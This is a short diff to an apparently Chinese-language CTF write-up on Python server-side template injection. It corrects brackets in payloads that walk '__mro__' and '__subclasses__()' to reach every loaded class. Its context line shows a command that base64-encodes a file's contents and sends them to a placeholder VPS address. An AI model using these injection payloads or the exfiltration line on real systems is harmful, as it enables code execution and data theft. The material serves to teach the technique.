@@ -302,7 +302,7 @@ vpsip:port/`{cat,--,--7xabf8sahdchfudy.txt}|base64`
 
 当我们访问到object的类型对象的时候，就可以用`__subclasses__()`来获得当前环境下能够访问的所有对象
 
-`[[''.__class__.__mro__[2].__subclasses__()}}`或者`{{(1).__class__.__base__.__subclasses__()]]`
+`[[''.__class__.__mro__[2].__subclasses__()]]`或者`[[(1).__class__.__base__.__subclasses__()]]`
 
 ![](https://ws1.sinaimg.cn/large/006Vib6xly1frghwxbelhj31400l4gvd.jpg)
 
